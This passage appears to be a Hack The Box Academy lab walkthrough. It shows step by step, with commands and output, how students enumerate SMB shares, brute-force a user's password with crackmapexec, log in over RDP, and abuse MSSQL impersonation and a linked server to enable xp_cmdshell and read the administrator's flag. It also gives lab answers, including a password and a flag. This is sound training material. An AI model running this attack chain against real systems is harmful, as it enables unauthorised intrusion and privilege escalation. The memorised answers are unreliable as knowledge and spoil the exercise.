|_ssl-date: 2022-11-27T19:20:37+00:00; +1s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-HARD
|   NetBIOS_Domain_Name: WIN-HARD
|   NetBIOS_Computer_Name: WIN-HARD
|   DNS_Domain_Name: WIN-HARD
|   DNS_Computer_Name: WIN-HARD
|   Product_Version: 10.0.17763
|_  System_Time: 2022-11-27T19:19:57+00:00
|_ssl-date: 2022-11-27T19:20:37+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=WIN-HARD
| Not valid before: 2022-11-26T19:16:00
|_Not valid after:  2023-05-28T19:16:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-11-27T19:20:00
|_  start_date: N/A
| ms-sql-info: 
|   10.129.112.104:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

Students will notice that the SMB service is open on port 445, therefore, they need to list the shares it has using `smbclient`:

Code: shell

```shell
smbclient -N -L STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-rureq65obq]─[~]
└──╼ [★]$ smbclient -N -L 10.129.112.104

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Home            Disk      
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

Thereafter, students need to connect to the `Home` share and list the directories within it:

Code: shell

```shell
smbclient -N //STMIP/Home
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-qnhsqvzyaq]─[~]
└──╼ [★]$ smbclient -N //10.129.112.104/Home

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 21 22:18:21 2022
  ..                                  D        0  Thu Apr 21 22:18:21 2022
  HR                                  D        0  Thu Apr 21 21:04:39 2022
  IT                                  D        0  Thu Apr 21 21:11:44 2022
  OPS                                 D        0  Thu Apr 21 21:05:10 2022
  Projects                            D        0  Thu Apr 21 21:04:48 2022

		7706623 blocks of size 4096. 3168554 blocks available
```

Within the `IT` directory, there are three other directories, which are `Fiona`, `John`, and `Simon`, and within each directory, there are files that students need to `get` to use in the subsequent questions:

Code: shell

```shell
cd IT/Fiona\
get creds.txt
cd ../Simon\
get random.txt
cd ../John\
prompt
mget *
```

```shell-session
smb: \> cd IT\Fiona\
smb: \IT\Fiona\> get creds.txt 
getting file \IT\Fiona\creds.txt of size 118 as creds.txt (2.9 KiloBytes/sec) (average 2.9 KiloBytes/sec)
smb: \IT\Fiona\> cd ../Simon\
smb: \IT\Simon\> get random.txt
getting file \IT\Simon\random.txt of size 94 as random.txt (2.4 KiloBytes/sec) (average 2.6 KiloBytes/sec)
smb: \IT\Simon\> cd ../John\
smb: \IT\John\> prompt
smb: \IT\John\> mget *
getting file \IT\John\information.txt of size 101 as information.txt (2.5 KiloBytes/sec) (average 2.6 KiloBytes/sec)
getting file \IT\John\notes.txt of size 164 as notes.txt (4.0 KiloBytes/sec) (average 2.9 KiloBytes/sec)
getting file \IT\John\secrets.txt of size 99 as secrets.txt (2.4 KiloBytes/sec) (average 2.8 KiloBytes/sec)
```

The file that was retrieved from the user `simon` is `random.txt`.

Answer: `random.txt`

# Attacking Common Services - Hard

## Question 2

### "Enumerate the target and find a password for the user Fiona. What is her password?"

From the previous question, students have attained the files `creds.txt`, `secrets.txt`, and `random.txt`, which all seem to contain potential passwords, therefore, students need to combine all of the files into one:

Code: shell

```shell
cat creds.txt secrets.txt random.txt > passwords.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-qnhsqvzyaq]─[~]
└──╼ [★]$ cat creds.txt secrets.txt random.txt > passwords.txt
```

Then, with the generated passwords wordlist, students need to use `crackmapexec` to bruteforce the password of the user `fiona` on SMB:

Code: shell

```shell
sudo cme smb STMIP -u fiona -p passwords.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-qnhsqvzyaq]─[~]
└──╼ [★]$ sudo cme smb 10.129.112.104 -u fiona -p passwords.txt

/root/.local/pipx/venvs/crackmapexec/lib/python3.9/site-packages/paramiko/transport.py:236: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
SMB         10.129.112.104  445    WIN-HARD         [*] Windows 10.0 Build 17763 x64 (name:WIN-HARD) (domain:WIN-HARD) (signing:False) (SMBv1:False)
SMB         10.129.112.104  445    WIN-HARD         [-] WIN-HARD\fiona:Windows Creds STATUS_LOGON_FAILURE 
SMB         10.129.112.104  445    WIN-HARD         [-] WIN-HARD\fiona: STATUS_LOGON_FAILURE 
SMB         10.129.112.104  445    WIN-HARD         [-] WIN-HARD\fiona:kAkd03SA@#! STATUS_LOGON_FAILURE 
SMB         10.129.112.104  445    WIN-HARD         [+] WIN-HARD\fiona:48Ns72!bns74@S84NNNSl
```

Students will attain the password `48Ns72!bns74@S84NNNSl`.

Answer: `48Ns72!bns74@S84NNNSl`

# Attacking Common Services - Hard

## Question 3

### "Once logged in, what other user can we compromise to gain admin privileges?"

Using the previously attained credentials `fiona:48Ns72!bns74@S84NNNSl`, students need to connect to spawned target utilizing `xfreerdp` and then open PowerShell:

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-qnhsqvzyaq]─[~]
└──╼ [★]$ xfreerdp /v:10.129.203.10 /u:fiona /p:'48Ns72!bns74@S84NNNSl'
<SNIP>
[20:59:35:699] [15143:15144] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[20:59:35:699] [15143:15144] [ERROR][com.freerdp.crypto] - Common Name (CN):
[20:59:35:699] [15143:15144] [ERROR][com.freerdp.crypto] - 	WIN-HARD
[20:59:35:699] [15143:15144] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.203.10:3389 (RDP-Server):
	Common Name: WIN-HARD
	Subject:     CN = WIN-HARD
	Issuer:      CN = WIN-HARD
	Thumbprint:  6a:a8:87:fc:e0:83:73:73:e7:da:b0:ec:d7:5d:33:e2:62:c3:97:ac:9e:d3:ae:72:b6:1c:83:93:ea:bf:50:d8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

![Attacking_Common_Services_Walkthrough_Image_4.png](https://academy.hackthebox.com/storage/walkthroughs/40/Attacking_Common_Services_Walkthrough_Image_4.png)

Thereafter, students need to connect to the default MSSQL instance by using Windows Authentication mode, providing the name of the computer `WIN-HARD` for the `-S` option:

Code: powershell

```powershell
SQLCMD.EXE -S WIN-HARD
```

```powershell-session
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Fiona> SQLCMD.EXE -S WIN-HARD
1>
```

Subsequently, students need to identify users that can be impersonated as, finding `john` and `simon`:

Code: sql

```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
GO
```

```powershell-session
1> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
2> GO

name
-------------
john
simon

(2 rows affected)
```

The answer will be the user `john`.

Answer: `john`

# Attacking Common Services - Hard

## Question 4

### "Submit the contents of the flag.txt file on the Administrator Desktop."

Using the same PowerShell session that is running `SQLCMD.exe` from the previous question, students need to query for `linked servers` from the `sysservers` table, finding one named `LOCAL.TEST.LINKED.SRV` (1 for `isremote` implies that the server is a `remote` one, while 0 implies that it is a `linked` one):

Code: sql

```sql
SELECT srvname, isremote FROM sysservers
GO
```

```powershell-session
1> SELECT srvname, isremote FROM sysservers
2> GO
srvname                           isremote
--------------------------------- --------
WINSRV02\SQLEXPRESS                1
LOCAL.TEST.LINKED.SRV              0

(2 rows affected)
```

From the previous question, students know that they can impersonate the user `john`, therefore, they need to check if `john` can connect to `LOCAL.TEST.LINKED.SRV` as a `sysadmin`:

Code: sql

```sql
EXECUTE AS LOGIN = 'john'
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
GO
```

```powershell-session
1> EXECUTE AS LOGIN = 'john'
2> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
3> GO

WINSRV02\SQLEXPRESS Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
        testadmin 1

(1 rows affected)
```

From the output, students know that `john` can connect to `LOCAL.TEST.LINKED.SRV` as the `sysadmin` user `testadmin`. Thus, with `john` being a `sysadmin`, students can enable `xp_cmdshell` on `LOCAL.TEST.LINKED.SRV` so that they can run commands afterward:

```sql
EXECUTE('EXECUTE sp_configure ''show advanced options'', 1;RECONFIGURE;EXECUTE sp_configure ''xp_cmdshell'', 1;RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
GO
```

```powershell-session
1> EXECUTE('EXECUTE sp_configure ''show advanced options'', 1;RECONFIGURE;EXECUTE sp_configure ''xp_cmdshell'', 1;RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
2> GO

Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

At last, students need to print out the contents of the flag file "flag.txt", which is under the `c:\users\administrator\desktop\` directory, finding it to be `HTB{46u$!n9_l!nk3d_$3rv3r$}`:

```sql
EXECUTE('xp_cmdshell ''more c:\users\administrator\desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
GO
```

```powershell-session
1> EXECUTE('xp_cmdshell ''more c:\users\administrator\desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
2> GO

output
---------------------------------------------
HTB{46u$!n9_l!nk3d_$3rv3r$}
NULL

(2 rows affected)
```

Answer: `HTB{46u$!n9_l!nk3d_$3rv3r$}`